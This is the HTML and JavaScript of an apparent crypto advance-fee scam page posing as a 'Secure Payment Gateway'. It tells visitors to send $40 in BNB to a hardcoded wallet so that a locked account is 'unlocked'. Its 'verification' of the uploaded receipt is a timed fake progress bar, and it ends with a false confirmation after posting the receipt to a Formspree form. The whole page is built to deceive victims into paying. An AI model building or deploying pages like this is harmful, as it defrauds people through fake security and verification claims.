<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secured Payment Gateway | CoreAnalytics</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #2563eb; --accent: #ff4b2b; --bg: #0f172a; --card: #1e293b; --success: #22c55e; }
        * { box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: var(--bg); color: white; margin: 0; padding: 20px; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        
        .pay-wrapper { background: var(--card); width: 100%; max-width: 420px; border-radius: 40px; padding: 40px 30px; border: 1px solid rgba(255,255,255,0.08); box-shadow: 0 50px 100px rgba(0,0,0,0.6); text-align: center; position: relative; overflow: hidden; }
        
        .status-header { display: inline-flex; align-items: center; background: rgba(37, 99, 235, 0.15); color: #60a5fa; padding: 8px 18px; border-radius: 50px; font-size: 10px; font-weight: 800; letter-spacing: 1px; margin-bottom: 25px; border: 1px solid rgba(96, 165, 250, 0.2); }
        .status-header span { width: 8px; height: 8px; background: #60a5fa; border-radius: 50%; margin-right: 8px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }

        .price-tag { margin-bottom: 35px; }
        .price-tag h1 { font-size: 52px; margin: 0; letter-spacing: -3px; font-weight: 800; }
        .price-tag p { font-size: 13px; color: #94a3b8; font-weight: 600; margin-top: 5px; }

        .wallet-container { background: #0f172a; border-radius: 24px; padding: 22px; margin-bottom: 30px; border: 1px solid #334155; cursor: pointer; transition: 0.2s; position: relative; }
        .wallet-container:hover { border-color: var(--primary); }
        .wallet-label { font-size: 9px; color: #475569; font-weight: 800; letter-spacing: 1.5px; margin-bottom: 10px; display: block; }
        .wallet-addr { font-size: 12px; color: #60a5fa; font-family: monospace; word-break: break-all; font-weight: 700; line-height: 1.4; }

        .upload-zone { border: 2px dashed #334155; border-radius: 30px; padding: 35px 20px; margin-bottom: 35px; transition: 0.4s; position: relative; }
        .upload-zone.ready { border-color: var(--success); background: rgba(34, 197, 94, 0.04); }
        
        .file-btn { background: white; color: #000; padding: 16px 28px; border-radius: 18px; font-size: 14px; font-weight: 800; cursor: pointer; display: inline-block; margin-bottom: 12px; transition: 0.2s; }
        .file-btn:active { transform: scale(0.95); }

        #verify-engine { display: none; margin-top: 20px; }
        .bar-bg { height: 8px; background: #0f172a; border-radius: 20px; overflow: hidden; margin-top: 12px; }
        .bar-fill { height: 100%; background: var(--success); width: 0%; transition: width 0.1s; }

        .final-btn { background: var(--primary); color: white; border: none; width: 100%; padding: 24px; border-radius: 22px; font-size: 18px; font-weight: 800; cursor: pointer; box-shadow: 0 15px 40px rgba(37, 99, 235, 0.35); transition: 0.3s; }
        .final-btn:disabled { opacity: 0.4; filter: grayscale(1); }

        .secure-footer { font-size: 10px; color: #475569; margin-top: 30px; font-weight: 700; letter-spacing: 1.5px; }
    </style>
</head>
<body>

<div class="pay-wrapper">
    <div class="status-header"><span></span> SECURE GATEWAY v7.4</div>
    
    <div class="price-tag">
        <h1>$40.00</h1>
        <p>Shortfall Liquidity Requirement</p>
    </div>

    <div style="font-size: 11px; color: #60a5fa; margin-bottom: 15px; font-weight: 800; letter-spacing: 1px;">NETWORK: BEP20 (BNB Smart Chain)</div>

    <div class="wallet-container" onclick="copyWallet()">
        <span class="wallet-label">DEPOSIT ADDRESS (TAP TO COPY)</span>
        <div class="wallet-addr" id="addr">0x4fE11766CD0bc8FEbAc47B0D55FAAcD596Ce49b4</div>
    </div>

    <form id="paymentForm">
        <div class="upload-zone" id="dropZone">
            <div id="prompt-text" style="font-size: 14px; font-weight: 700; color: #cbd5e1; margin-bottom: 15px;">Upload Transfer Receipt</div>
            
            <label for="receipt" class="file-btn" id="labelBtn">Select Screenshot</label>
            <input type="file" name="receipt" id="receipt" accept="image/*" style="display:none" onchange="startScan(this)" required>
            
            <div id="verify-engine">
                <div style="font-size: 11px; color: var(--success); font-weight: 800; margin-bottom: 6px;" id="scanStatus">Scanning Block Data...</div>
                <div class="bar-bg"><div class="bar-fill" id="progress"></div></div>
            </div>
        </div>

        <input type="hidden" name="Target_Wallet" value="0x4fE11766CD0bc8FEbAc47B0D55FAAcD596Ce49b4">

        <button type="submit" class="final-btn" id="finishBtn" disabled>VERIFY & UNLOCK ACCOUNT</button>
    </form>

    <div class="secure-footer">NODE ENCRYPTED | END-TO-END</div>
</div>

<script>
    function copyWallet() {
        const text = document.getElementById('addr').innerText;
        navigator.clipboard.writeText(text);
        alert("Wallet Address Copied to Clipboard!");
    }

    function startScan(input) {
        if (input.files && input.files[0]) {
            document.getElementById('verify-engine').style.display = 'block';
            document.getElementById('labelBtn').style.display = 'none';
            document.getElementById('dropZone').classList.add('ready');
            
            let w = 0;
            const p = document.getElementById('progress');
            const s = document.getElementById('scanStatus');
            
            const interval = setInterval(() => {
                if (w >= 100) {
                    clearInterval(interval);
                    s.innerText = "✓ TRANSACTION HASH IDENTIFIED";
                    document.getElementById('finishBtn').disabled = false;
                } else {
                    w++;
                    p.style.width = w + "%";
                    if(w == 30) s.innerText = "Authenticating Signature...";
                    if(w == 70) s.innerText = "Checking Network Confirmations...";
                }
            }, 60);
        }
    }

    // Handle Formspree Submission
    const form = document.getElementById('paymentForm');
    form.onsubmit = async (e) => {
        e.preventDefault();
        const btn = document.getElementById('finishBtn');
        btn.innerText = "SUBMITTING TO NODE...";
        btn.disabled = true;

        const formData = new FormData(form);

        try {
            const response = await fetch("https://formspree.io/f/xrejzraw", {
                method: "POST",
                body: formData,
                headers: { 'Accept': 'application/json' }
            });

            if (response.ok) {
                alert("SUBMISSION SUCCESSFUL: Your account is being synchronized. Please allow 5-15 minutes for the network to confirm your $40.00 deposit. You can now close this window.");
                window.location.href = "index.html";
            } else {
                throw new Error();
            }
        } catch (error) {
            alert("Network Error: Verification timed out. Please try again.");
            btn.innerText = "VERIFY & UNLOCK ACCOUNT";
            btn.disabled = false;
        }
    };
</script>

</body>
</html>
